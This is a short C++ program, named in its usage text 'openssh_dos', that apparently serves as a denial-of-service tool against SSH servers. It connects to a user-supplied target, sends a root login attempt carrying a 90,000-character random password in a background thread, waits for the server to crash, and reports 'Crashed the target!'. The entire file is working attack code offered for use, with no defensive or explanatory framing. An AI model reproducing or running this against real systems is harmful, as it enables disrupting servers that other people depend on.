#include "hdr.h"

int main(int argc, char* argv[]) {
	if (argc != 3) {
		cout << "Usage:" << endl << "openssh_dos [target] [port]" << endl;
		return 1;
	}

	ssh_session ssh = ssh_new();

	ssh_options_set(ssh, SSH_OPTIONS_HOST, argv[1]);
	ssh_options_set(ssh, SSH_OPTIONS_PORT, argv[2]);
	if (ssh_connect(ssh)) {
		cout << "Failed to connect to target. Are you sure you've typed their IP correctly?" << endl;
		return 1;
	}

	thread auth(ssh_userauth_password, ssh, "root", ran_str(90000).c_str());

	cout << "Waiting for target to crash...\r";
	Sleep(1000);
    waitForCrash(argv[1], argv[2]);
    cout << "Crashed the target!                                                                             " << endl;

	auth.detach();

	return 1;
}